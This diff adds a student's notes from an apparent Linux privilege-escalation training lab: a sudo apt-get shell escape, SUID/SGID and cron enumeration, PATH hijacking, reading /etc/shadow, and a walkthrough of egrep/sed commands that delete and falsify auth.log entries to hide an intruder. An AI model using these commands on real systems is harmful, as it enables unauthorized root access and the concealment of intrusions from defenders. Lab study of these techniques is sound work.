@@ -1,0 +1,1118 @@
+Linux Privilege Escalation 
+
+Checks
+1. Check permission level
+2. check apt-get
+3. gtfobins.github.io
+4. elevate privilege
+
+Sample:
+demo1@stu:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+# sudo -l
+Matching Defaults entries for root on stu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User root may run the following commands on stu:
+    (ALL : ALL) ALL  ---- THIS IS WHAT YOU NEED TO GET TO -----
+# whoami
+root
+# /bin/bash
+
+What can you do from here:
+1. cat /etc/shadow
+2. su demo2 - login as a different user
+3. sudo -l
+
+demo2@stu:/home/demo1$ sudo -l
+Matching Defaults entries for demo2 on stu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User demo2 may run the following commands on stu:
+    (root) NOPASSWD: /bin/cat /var/log/syslog*
+
+4. ls -la /var/log/sys* - look for the wildcard then look for waht you can read. Basically read anything.
+5. suid/sgid checks
+demo2@stu:/home/demo1$ find / -type f /4000 -ls 2>/dev/null
+
+How to find the SUID
+demo2@stu:~$ cd ~ # to get to the directory
+demo2@stu:~$ find / -type f -perm /4000 -ls 2>/dev/null # what you can run with elevated privileges
+    64297    372 -rwsr-xr--   1 root     dip        378600 Jul 23  2020 /usr/sbin/pppd
+     6493    100 -rwsr-xr-x   1 root     root       100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+    12442    428 -rwsr-xr-x   1 root     root       436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
+     7930     44 -rwsr-xr--   1 root     messagebus    42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+     8026    108 -rwsr-sr-x   1 root     root         109432 Oct 30  2019 /usr/lib/snapd/snap-confine
+     7934     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+     8020     16 -rwsr-xr-x   1 root     root          14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+     4341     76 -rwsr-xr-x   1 root     root          75824 Mar 22  2019 /usr/bin/gpasswd
+     4342     60 -rwsr-xr-x   1 root     root          59640 Mar 22  2019 /usr/bin/passwd
+     4648     40 -rwsr-xr-x   1 root     root          37136 Mar 22  2019 /usr/bin/newuidmap
+     4339     44 -rwsr-xr-x   1 root     root          44528 Mar 22  2019 /usr/bin/chsh
+     4140     40 -rwsr-xr-x   1 root     root          40344 Mar 22  2019 /usr/bin/newgrp
+     4338     76 -rwsr-xr-x   1 root     root          76496 Mar 22  2019 /usr/bin/chfn
+     4539     52 -rwsr-sr-x   1 daemon   daemon        51464 Feb 20  2018 /usr/bin/at
+     4659     24 -rwsr-xr-x   1 root     root          22520 Mar 27  2019 /usr/bin/pkexec
+     4495     20 -rwsr-xr-x   1 root     root          18448 Jun 28  2019 /usr/bin/traceroute6.iputils
+     4647     40 -rwsr-xr-x   1 root     root          37136 Mar 22  2019 /usr/bin/newgidmap
+    64110     24 -rwsr-xr-x   1 root     root          22528 Jun 28  2019 /usr/bin/arping
+     4261    148 -rwsr-xr-x   1 root     root         149080 Jan 31  2020 /usr/bin/sudo
+      139     32 -rwsr-xr-x   1 root     root          30800 Aug 11  2016 /bin/fusermount
+   258108    832 -rwsr-xr-x   1 root     root         849288 Mar 23  2022 /bin/netstat_natpu
+       56     44 -rwsr-xr-x   1 root     root          43088 Jan  8  2020 /bin/mount
+      109     64 -rwsr-xr-x   1 root     root          64424 Jun 28  2019 /bin/ping
+       55     44 -rwsr-xr-x   1 root     root          44664 Mar 22  2019 /bin/su
+       57     28 -rwsr-xr-x   1 root     root          26696 Jan  8  2020 /bin/umount
+
+
+For purposes for the class - anything you see on linops not going to be the vulnerability. 
+You are looking for vulnerabilities. 
+
+
+How to find the SGID 
+
+demo2@stu:~$ find / -type f -perm /2000 -ls 2>/dev/null
+     6532     12 -rwxr-sr-x   1 root     utmp        10232 Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
+     8026    108 -rwsr-sr-x   1 root     root       109432 Oct 30  2019 /usr/lib/snapd/snap-confine
+     4337     72 -rwxr-sr-x   1 root     shadow      71816 Mar 22  2019 /usr/bin/chage
+     4303     40 -rwxr-sr-x   1 root     crontab     39352 Nov 16  2017 /usr/bin/crontab
+     4340     24 -rwxr-sr-x   1 root     shadow      22808 Mar 22  2019 /usr/bin/expiry
+     4499     44 -rwxr-sr-x   1 root     mlocate     43088 Mar  1  2018 /usr/bin/mlocate
+     4507    356 -rwxr-sr-x   1 root     ssh        362640 Mar  4  2019 /usr/bin/ssh-agent
+     4400     16 -rwxr-sr-x   1 root     tty         14328 Jan 17  2018 /usr/bin/bsd-write
+     4539     52 -rwsr-sr-x   1 daemon   daemon      51464 Feb 20  2018 /usr/bin/at
+     4058     32 -rwxr-sr-x   1 root     tty         30800 Jan  8  2020 /usr/bin/wall
+     3823     36 -rwxr-sr-x   1 root     shadow      34816 Feb 27  2019 /sbin/unix_chkpwd
+     3819     36 -rwxr-sr-x   1 root     shadow      34816 Feb 27  2019 /sbin/pam_extrausers_chkpwd
+
+To get all SSID / SGID
+
+demo2@stu:~$ find / -type f -perm /6000 -ls 2>/dev/null
+    64297    372 -rwsr-xr--   1 root     dip        378600 Jul 23  2020 /usr/sbin/pppd
+     6532     12 -rwxr-sr-x   1 root     utmp        10232 Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
+     6493    100 -rwsr-xr-x   1 root     root       100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+    12442    428 -rwsr-xr-x   1 root     root       436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
+     7930     44 -rwsr-xr--   1 root     messagebus    42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+     8026    108 -rwsr-sr-x   1 root     root         109432 Oct 30  2019 /usr/lib/snapd/snap-confine
+     7934     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+     8020     16 -rwsr-xr-x   1 root     root          14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+     4341     76 -rwsr-xr-x   1 root     root          75824 Mar 22  2019 /usr/bin/gpasswd
+     4337     72 -rwxr-sr-x   1 root     shadow        71816 Mar 22  2019 /usr/bin/chage
+     4342     60 -rwsr-xr-x   1 root     root          59640 Mar 22  2019 /usr/bin/passwd
+     4303     40 -rwxr-sr-x   1 root     crontab       39352 Nov 16  2017 /usr/bin/crontab
+     4340     24 -rwxr-sr-x   1 root     shadow        22808 Mar 22  2019 /usr/bin/expiry
+     4499     44 -rwxr-sr-x   1 root     mlocate       43088 Mar  1  2018 /usr/bin/mlocate
+     4507    356 -rwxr-sr-x   1 root     ssh          362640 Mar  4  2019 /usr/bin/ssh-agent
+     4648     40 -rwsr-xr-x   1 root     root          37136 Mar 22  2019 /usr/bin/newuidmap
+     4339     44 -rwsr-xr-x   1 root     root          44528 Mar 22  2019 /usr/bin/chsh
+     4140     40 -rwsr-xr-x   1 root     root          40344 Mar 22  2019 /usr/bin/newgrp
+     4338     76 -rwsr-xr-x   1 root     root          76496 Mar 22  2019 /usr/bin/chfn
+     4400     16 -rwxr-sr-x   1 root     tty           14328 Jan 17  2018 /usr/bin/bsd-write
+     4539     52 -rwsr-sr-x   1 daemon   daemon        51464 Feb 20  2018 /usr/bin/at
+     4659     24 -rwsr-xr-x   1 root     root          22520 Mar 27  2019 /usr/bin/pkexec
+     4058     32 -rwxr-sr-x   1 root     tty           30800 Jan  8  2020 /usr/bin/wall
+     4495     20 -rwsr-xr-x   1 root     root          18448 Jun 28  2019 /usr/bin/traceroute6.iputils
+     4647     40 -rwsr-xr-x   1 root     root          37136 Mar 22  2019 /usr/bin/newgidmap
+    64110     24 -rwsr-xr-x   1 root     root          22528 Jun 28  2019 /usr/bin/arping
+     4261    148 -rwsr-xr-x   1 root     root         149080 Jan 31  2020 /usr/bin/sudo
+     3823     36 -rwxr-sr-x   1 root     shadow        34816 Feb 27  2019 /sbin/unix_chkpwd
+     3819     36 -rwxr-sr-x   1 root     shadow        34816 Feb 27  2019 /sbin/pam_extrausers_chkpwd
+      139     32 -rwsr-xr-x   1 root     root          30800 Aug 11  2016 /bin/fusermount
+   258108    832 -rwsr-xr-x   1 root     root         849288 Mar 23  2022 /bin/netstat_natpu
+       56     44 -rwsr-xr-x   1 root     root          43088 Jan  8  2020 /bin/mount
+      109     64 -rwsr-xr-x   1 root     root          64424 Jun 28  2019 /bin/ping
+       55     44 -rwsr-xr-x   1 root     root          44664 Mar 22  2019 /bin/su
+       57     28 -rwsr-xr-x   1 root     root          26696 Jan  8  2020 /bin/umount
+
+Next step - then go to gtfobins and check for vulnerabities with this data.
+
+Do a linux review of output of ls -l on what privlege people have 
+what is the point of thick bit (SUID) - 
+d- directory
+l- symbolic link
+look at all of this again.
+
+Capabilities - 
+
+under GTFOBINS - look for options like sudo, suid, etc. they have to be tagged.
+demo2@stu:~$ file /bin/netstat_natpu
+/bin/netstat_natpu: setuid ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=fbb80959eba1d2773de8839995ede67c0a965a47, not stripped
+
+Before we get into behavioral, string or cat the item - 
+strings 
+
+netstat -natpu  (don't get PID)
+demo2@stu:~$ netstat -natpu
+(No info could be read for "-p": geteuid()=1002 but you should be root.)
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:6010          0.0.0.0:*               LISTEN      -                   
+tcp        0      1 10.10.28.42:35524       10.50.255.254:53        SYN_SENT    -                   
+tcp        0      0 10.10.28.42:22          10.10.28.40:52996       ESTABLISHED -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 ::1:6010                :::*                    LISTEN      -                   
+udp        0      0 10.10.28.42:46501       10.50.255.254:53        ESTABLISHED -                   
+udp        0      0 10.10.28.42:56293       10.50.255.254:53        ESTABLISHED -                   
+udp        0      0 10.10.28.42:41005       10.50.255.254:53        ESTABLISHED -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
+udp        0      0 127.0.0.1:57685         127.0.0.53:53           ESTABLISHED -  
+
+strings /bin/netstat_natpu | grep netstat
+netstat -antpu
+
+
+CRON - 
+demo2@stu:~$ crontab -l
+no crontab for demo2
+demo2@stu:~$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+
+
+numbers are the minute/on the minute, then m, hr, dof month, m
+* (every). for running every minute its * then the number.
+
+ls -la /etc/cron.hourly.
+
+demo2@stu:~$ ls -la /etc/cron.hourly
+total 12
+drwxr-xr-x  2 root root 4096 Mar  4  2020 .
+drwxr-xr-x 95 root root 4096 Jan  5 16:18 ..
+-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
+there are no write privleges here. need write privleges
+
+demo2@stu:~$ ls -la /etc/cron.daily
+total 60
+drwxr-xr-x  2 root root 4096 Mar  4  2020 .
+drwxr-xr-x 95 root root 4096 Jan  5 16:18 ..
+-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
+-rwxr-xr-x  1 root root  376 Nov 11  2019 apport
+-rwxr-xr-x  1 root root 1478 Apr 20  2018 apt-compat
+-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
+-rwxr-xr-x  1 root root 1176 Nov  2  2017 dpkg
+-rwxr-xr-x  1 root root  372 Aug 21  2017 logrotate
+-rwxr-xr-x  1 root root 1065 Apr  7  2018 man-db
+-rwxr-xr-x  1 root root  539 Jan 14  2020 mdadm
+-rwxr-xr-x  1 root root  538 Mar  1  2018 mlocate
+-rwxr-xr-x  1 root root  249 Jan 25  2018 passwd
+-rwxr-xr-x  1 root root 3477 Feb 21  2018 popularity-contest
+-rwxr-xr-x  1 root root  246 Mar 21  2018 ubuntu-advantage-tools
+-rwxr-xr-x  1 root root  214 Nov 12  2018 update-notifier-common
+demo2@stu:~$ ls -la /etc/cron.weekly
+total 20
+drwxr-xr-x  2 root root 4096 Mar  4  2020 .
+drwxr-xr-x 95 root root 4096 Jan  5 16:18 ..
+-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
+-rwxr-xr-x  1 root root  723 Apr  7  2018 man-db
+-rwxr-xr-x  1 root root  211 Nov 12  2018 update-notifier-common
+demo2@stu:~$ ls -la /etc/cron.monthly
+total 12
+drwxr-xr-x  2 root root 4096 Mar  4  2020 .
+drwxr-xr-x 95 root root 4096 Jan  5 16:18 ..
+-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
+
+
+demo2@stu:~$ ls -la /etc/cron*
+-rw-r--r-- 1 root root  722 Nov 16  2017 /etc/crontab
+
+/etc/cron.d:
+total 20
+drwxr-xr-x  2 root root 4096 Mar  4  2020 .
+drwxr-xr-x 95 root root 4096 Jan  5 16:18 ..
+-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
+-rw-r--r--  1 root root  589 Jan 14  2020 mdadm
+-rw-r--r--  1 root root  191 Mar  4  2020 popularity-contest
+
+/etc/cron.daily:
+total 60
+drwxr-xr-x  2 root root 4096 Mar  4  2020 .
+drwxr-xr-x 95 root root 4096 Jan  5 16:18 ..
+-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
+-rwxr-xr-x  1 root root  376 Nov 11  2019 apport
+-rwxr-xr-x  1 root root 1478 Apr 20  2018 apt-compat
+-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
+-rwxr-xr-x  1 root root 1176 Nov  2  2017 dpkg
+-rwxr-xr-x  1 root root  372 Aug 21  2017 logrotate
+-rwxr-xr-x  1 root root 1065 Apr  7  2018 man-db
+-rwxr-xr-x  1 root root  539 Jan 14  2020 mdadm
+-rwxr-xr-x  1 root root  538 Mar  1  2018 mlocate
+-rwxr-xr-x  1 root root  249 Jan 25  2018 passwd
+-rwxr-xr-x  1 root root 3477 Feb 21  2018 popularity-contest
+-rwxr-xr-x  1 root root  246 Mar 21  2018 ubuntu-advantage-tools
+-rwxr-xr-x  1 root root  214 Nov 12  2018 update-notifier-common
+
+/etc/cron.hourly:
+total 12
+drwxr-xr-x  2 root root 4096 Mar  4  2020 .
+drwxr-xr-x 95 root root 4096 Jan  5 16:18 ..
+-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
+
+/etc/cron.monthly:
+total 12
+drwxr-xr-x  2 root root 4096 Mar  4  2020 .
+drwxr-xr-x 95 root root 4096 Jan  5 16:18 ..
+-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
+
+/etc/cron.weekly:
+total 20
+drwxr-xr-x  2 root root 4096 Mar  4  2020 .
+drwxr-xr-x 95 root root 4096 Jan  5 16:18 ..
+-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
+-rwxr-xr-x  1 root root  723 Apr  7  2018 man-db
+-rwxr-xr-x  1 root root  211 Nov 12  2018 update-notifier-common
+
+As of now, you can' twrite to any of these. 
+these are typical files.
+
+check your log rotate as an option - fun example
+
+demo2@stu:~$ cat /etc/cron.daily/logrotate
+#!/bin/sh
+
+# Clean non existent log file entries from status file
+cd /var/lib/logrotate
+test -e status || touch status
+head -1 status > status.clean
+sed 's/"//g' status | while read logfile date
+do
+    [ -e "$logfile" ] && echo "\"$logfile\" $date"
+done >> status.clean
+mv status.clean status
+
+test -x /usr/sbin/logrotate || exit 0
+/usr/sbin/logrotate /etc/logrotate.conf
+
+cmds
+echo blah > test3
+touch test3
+ls -la
+
+
+ls -la  /var/spool/cron/crontabs
+you typically cant' see anything as you don't have root. 
+
+find world writeable locations
+find / -type f -perm /2 -o -type d -perm /2 2>/dev/null 
+- grep around this to see other specific items
+but tmp and /var/tmp are where you are likely going to be. 
+
+demo2@stu:~$ ls -la
+total 20
+drwxr-xr-x 2 demo2 demo2 4096 Apr 11  2022 .
+drwxr-xr-x 5 root  root  4096 Apr 11  2022 ..
+-rw------- 1 demo2 demo2    0 Apr 11  2022 .bash_history
+-rw-r--r-- 1 demo2 demo2  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 demo2 demo2 3771 Apr  4  2018 .bashrc
+-rw-r--r-- 1 demo2 demo2  807 Apr  4  2018 .profile
+
+you can also put stuff into the users profile if you are logged into them. they have access to .profile
+CRON can be used by itself, otherwise its about chaining pieces together you can do a lot.
+
+. and PATHcomrade@lin1:~$ find / -type f -perm /6000 -ls 2>/dev/null
+   258328     20 -rwxr-sr-x   1 root     staff       16520 Oct 20  2021 /var/tmp/testbed/unknown
+    64365    372 -rwsr-xr--   1 root     dip        378600 Jul 23  2020 /usr/sbin/pppd
+     6532     12 -rwxr-sr-x   1 root     utmp        10232 Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
+     6493    100 -rwsr-xr-x   1 root     root       100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+    12442    428 -rwsr-xr-x   1 root     root       436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
+     7930     44 -rwsr-xr--   1 root     messagebus    42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+     8026    108 -rwsr-sr-x   1 root     root         109432 Oct 30  2019 /usr/lib/snapd/snap-confine
+     7934     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+     8020     16 -rwsr-xr-x   1 root     root          14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+     4341     76 -rwsr-xr-x   1 root     root          75824 Mar 22  2019 /usr/bin/gpasswd
+     4337     72 -rwxr-sr-x   1 root     shadow        71816 Mar 22  2019 /usr/bin/chage
+     4342     60 -rwsr-xr-x   1 root     root          59640 Mar 22  2019 /usr/bin/passwd
+     4303     40 -rwxr-sr-x   1 root     crontab       39352 Nov 16  2017 /usr/bin/crontab
+     4340     24 -rwxr-sr-x   1 root     shadow        22808 Mar 22  2019 /usr/bin/expiry
+     4499     44 -rwxr-sr-x   1 root     mlocate       43088 Mar  1  2018 /usr/bin/mlocate
+     4507    356 -rwxr-sr-x   1 root     ssh          362640 Mar  4  2019 /usr/bin/ssh-agent
+     4648     40 -rwsr-xr-x   1 root     root          37136 Mar 22  2019 /usr/bin/newuidmap
+     4339     44 -rwsr-xr-x   1 root     root          44528 Mar 22  2019 /usr/bin/chsh
+     4140     40 -rwsr-xr-x   1 root     root          40344 Mar 22  2019 /usr/bin/newgrp
+     4338     76 -rwsr-xr-x   1 root     root          76496 Mar 22  2019 /usr/bin/chfn
+     4400     16 -rwxr-sr-x   1 root     tty           14328 Jan 17  2018 /usr/bin/bsd-write
+     4539     52 -rwsr-sr-x   1 daemon   daemon        51464 Feb 20  2018 /usr/bin/at
+     4659     24 -rwsr-xr-x   1 root     root          22520 Mar 27  2019 /usr/bin/pkexec
+     4058     32 -rwxr-sr-x   1 root     tty           30800 Jan  8  2020 /usr/bin/wall
+     4495     20 -rwsr-xr-x   1 root     root          18448 Jun 28  2019 /usr/bin/traceroute6.iputils
+     4647     40 -rwsr-xr-x   1 root     root          37136 Mar 22  2019 /usr/bin/newgidmap
+    64178     24 -rwsr-xr-x   1 root     root          22528 Jun 28  2019 /usr/bin/arping
+     4261    148 -rwsr-xr-x   1 root     root         149080 Jan 31  2020 /usr/bin/sudo
+     3823     36 -rwxr-sr-x   1 root     shadow        34816 Feb 27  2019 /sbin/unix_chkpwd
+     3819     36 -rwxr-sr-x   1 root     shadow        34816 Feb 27  2019 /sbin/pam_extrausers_chkpwd
+      139     32 -rwsr-xr-x   1 root     root          30800 Aug 11  2016 /bin/fusermount
+       56     44 -rwsr-xr-x   1 root     root          43088 Jan  8  2020 /bin/mount
+      109     64 -rwsr-xr-x   1 root     root          64424 Jun 28  2019 /bin/ping
+       55     44 -rwsr-xr-x   1 root     root          44664 Mar 22  2019 /bin/su
+       57     28 -rwsr-xr-x   1 root     root          26696 Jan  8  2020 /bin/umount
+comrade@lin1:~$ cd /var/tmp/testbed/unknown
+-bash: cd: /var/tmp/testbed/unknown: Not a directory
+comrade@lin1:~$ cd /var/tmp/testbed/
+comrade@lin1:/var/tmp/testbed$ ls -la
+total 32
+drwxr-xr-x 3 root staff  4096 Nov  3  2021 .
+drwxrwxrwt 6 root root   4096 Jan  5 16:18 ..
+drwxrwx--- 2 root staff  4096 Nov  3  2021 logger
+-rwxr-sr-x 1 root staff 16520 Oct 20  2021 unknown
+comrade@lin1:/var/tmp/testbed$ file unknown 
+unknown: setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, not stripped
+
+
+echo $PATH
+which cat
+whereis cat
+
+demo2@stu:~$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+demo2@stu:~$ which cat
+/bin/cat
+demo2@stu:~$ where cat
+where: command not found
+demo2@stu:~$ whereis cat
+cat: /bin/cat /usr/share/man/man1/cat.1.gz
+demo2@stu:~$ 
+
+you can create a script - 
+
+
+
+
+echo $PATH 
+save this otuputsomewhere safe
+echo $PATH > path.back
+changing your path:
+1. PATH=/tmp:$PATH
+2. echo $PATH (to check the change)
+3. uname -a
+4. cat /proc/version
+5. look at a vulnerability online for this on google
+
+swap file - *~
+tmp file that gets deleted as soon as you save it
+temporary states. this can have information.
+
+
+Donovian Linux Privilege Escalation, and Persistence (DLP)
+XX Feb 2027
+Start Time: 1300
+Duration: 4 hours
+
+Type of Operation: Cyberspace Exploitation (C-E)
+
+Objective: Maneuver into the Donovian internal network, gain privileged access to discovered Linux hosts.
+
+Tools/Techniques: SSH masquerade into internal network with provided credentials. Ports in use will be dependent on target location and are subject to change. Linux techniques to gain privileged access and persist are limited to host misconfigurations, open suid/sgid, weak permissions, and path. Network scanning tools/technique usage is at the discretion of student.
+
+Scenario Credentials: FLAG = H@RDl1nux5t@rt0F@ct1v1ty
+
+Prior Approvals: Privilege escalation, persistence, and restarting of services through host reboot. Host survey and log sanitation utilizing native command shells, which shell is at discretion of student. NOT authorized is uploading of tools or altering account information.
+
+Scheme of Maneuver:
+>Jump Box
+->Pivot:192.168.28.105
+--->T1: 192.168.28.27
+--->T2: 192.168.28.12
+
+Target Section:
+
+Pivot
+Hostname: Donovian-Terminal
+IP: 192.168.28.105
+OS: Ubuntu 18.04
+Creds: comrade :: StudentReconPassword
+Last Known SSH Port: 2222
+PSP: rkhunter
+Malware: none
+Action: Perform SSH masquerade and redirect to the next target. No survey required, cohabitation with known PSP approved.
+
+T1
+Hostname: unknown
+IP: 192.168.28.27
+OS: Linux ver: Unknown
+Creds: comrade :: StudentPrivPassword
+Last Known Ports: unknown
+PSP: unknown
+Malware: unknown
+Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.
+
+T2
+Hostname: unknown
+IP: 192.168.28.12
+OS: Linux ver: Unknown
+Creds: comrade :: StudentPrivPassword
+Last Known Ports: unknown
+PSP: unknown
+Malware: unknown
+Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.
+
+
+
+A member of your team has accessed a Linux system within the 192.168.0.0/16 network as a regular user named billybob. This team member has left residual information of their activity on the system. Although the user name billybob is a regular user of the system, the IPv4 address from where your team member authenticated is not a typical IPv4 address used to authenticate to the system.
+
+In order to prevent discovery of your teams actions on the system you must manipulate the authentication log.
+
+    There are log entries from the network your team pivoted from; however during a data transfer the OP notes where lost. The team is sure that the pivots occurred from the 172 net.
+
+In order to receive credit for this challenge you must provide the md5sum of the auth.log after it has been cleaned.
+
+    There are log entries from the network you pivoted from. >> >Pivot:192.168.28.105
+    You don’t know the exact IP address but you know the network is a 172.16.0.0/16
+    The user name is 'billybob'
+    There are two authentication events that need sanitizing.
+
+It has been decided that the first authentication event and its related logs will be deleted, and the second authentication event will be modified to make it look as though the user came from the IPv4 address 192.168.1.103.
+
+    In order to receive credit for this challenge you must provide the md5sum of the auth.log after it has been cleaned.
+
+student@lin-ops:~/Downloads$ cat auth.log | grep 172.16.
+Feb 28 21:51:32 localhost sshd[16582]: Accepted keyboard-interactive/pam for billybob from 172.16.4.6 port 31627 ssh2
+Mar  1 10:02:15 localhost sshd[16591]: Received disconnect from 172.16.4.6 port 31627:11: disconnected by user
+Mar  1 10:02:15 localhost sshd[16591]: Disconnected from user billybob 172.16.4.6 port 31627
+Mar 23 20:30:17 localhost sshd[4452]: Accepted keyboard-interactive/pam for billybob from 172.16.34.4 port 31672 ssh2
+Mar 23 23:47:51 localhost sshd[4461]: Received disconnect from 172.16.34.4 port 31672:11: disconnected by user
+Mar 23 23:47:51 localhost sshd[4461]: Disconnected from user billybob 172.16.34.4 port 31672
+
+Remove
+student@lin-ops:~/Downloads$ cat auth.log | grep "Feb 28 21:51:32"
+Feb 28 21:51:32 localhost sshd[16582]: Accepted keyboard-interactive/pam for billybob from 172.16.4.6 port 31627 ssh2
+Feb 28 21:51:32 localhost sshd[16582]: pam_unix(sshd:session): session opened for user billybob by (uid=0)
+
+
+student@lin-ops:~/Downloads$ cat auth.log | grep "Mar  1 10:02:15"
+Mar  1 10:02:15 localhost sshd[16591]: Received disconnect from 172.16.4.6 port 31627:11: disconnected by user
+Mar  1 10:02:15 localhost sshd[16591]: Disconnected from user billybob 172.16.4.6 port 31627
+Mar  1 10:02:15 localhost sshd[16582]: pam_unix(sshd:session): session closed for user billybob
+
+Replace:
+student@lin-ops:~/Downloads$ cat auth.log | grep "Mar 23 20:30:17"
+Mar 23 20:30:17 localhost sshd[4452]: Accepted keyboard-interactive/pam for billybob from 172.16.34.4 port 31672 ssh2
+Mar 23 20:30:17 localhost sshd[4452]: pam_unix(sshd:session): session opened for user billybob by (uid=0)
+Replace: 
+student@lin-ops:~/Downloads$ cat auth.log | grep "Mar 23 23:47:51"
+Mar 23 23:47:51 localhost sshd[4461]: Received disconnect from 172.16.34.4 port 31672:11: disconnected by user
+Mar 23 23:47:51 localhost sshd[4461]: Disconnected from user billybob 172.16.34.4 port 31672
+Mar 23 23:47:51 localhost sshd[4452]: pam_unix(sshd:session): session closed for user billybob
+
+Remove Command:
+egrep -v 'Feb 28 21:51:32' auth.log > auth.log2; cat auth.log2 > auth.log; rm auth.log2
+egrep -v 'Mar 1 10:02:15' auth.log > auth.log2; cat auth.log2 > auth.log; rm auth.log2
+
+Replace Command
+cat auth.log > auth.log2; sed -i 's/172.16.34.4/192.168.1.103/g'  auth.log2; cat auth.log2 > auth.log
+
+
+student@lin-ops:~/Downloads$ cat auth.log | grep "Mar 23 20:30:17"
+Mar 23 20:30:17 localhost sshd[4452]: Accepted keyboard-interactive/pam for billybob from 192.168.1.103 port 31672 ssh2
+Mar 23 20:30:17 localhost sshd[4452]: pam_unix(sshd:session): session opened for user billybob by (uid=0)
+student@lin-ops:~/Downloads$ cat auth.log | grep "Mar 23 23:47:51"
+Mar 23 23:47:51 localhost sshd[4461]: Received disconnect from 192.168.1.103 port 31672:11: disconnected by user
+Mar 23 23:47:51 localhost sshd[4461]: Disconnected from user billybob 192.168.1.103 port 31672
+Mar 23 23:47:51 localhost sshd[4452]: pam_unix(sshd:session): session closed for user billybob
+student@lin-ops:~/Downloads$ cat auth.log | grep "Mar 23 23:47:51"
+Mar 23 23:47:51 localhost sshd[4461]: Received disconnect from 192.168.1.103 port 31672:11: disconnected by user
+Mar 23 23:47:51 localhost sshd[4461]: Disconnected from user billybob 192.168.1.103 port 31672
+Mar 23 23:47:51 localhost sshd[4452]: pam_unix(sshd:session): session closed for user billybob
+
+
+
+R Syslog - 
+
+Log by Facility
+The initial sections define where messages from specific system components (facilities) are logged. 
+auth,authpriv.* are commented out, but would typically log authentication messages to /var/log/auth.log.
+daemon.* logs all daemon-related messages to /var/log/daemon.log. The hyphen (-) prefix means the log file will not be synchronized to disk after every message, improving performance [1].
+local7.alert sends only messages with an alert priority from facility local7 to /var/tmp/boot.log. This facility is often used for boot process logs [1].
+mail.* logs all mail-related messages to /var/log/mail.log, again with the performance optimization hyphen. 
+Fine-Grained Mail Logging
+This section provides more granular control over mail logs: 
+mail.info logs info priority mail messages to /var/log/mail.info.
+mail.warn logs warn priority mail messages to /var/log/mail.warn.
+mail.err logs only err priority mail messages to /var/log/mail.err (which will sync to disk after every message). 
+Debug and Informational Messages
+These rules manage general system information and debug logs, specifically excluding authentication, mail, and news-related messages to prevent duplication: 
+*.*=debug;... captures all debug messages (excluding specified facilities) into /var/log/debug.
+*.*=info;... captures info, notice, and warn messages (excluding specified facilities) into /var/log/messages. 
+Emergency Messages and Remote Logging
+The final section defines actions for critical events and remote forwarding: 
+*.emerg uses the :omusrmsg:* action to send all emerg (emergency) messages to all currently logged-in users' terminals [1].
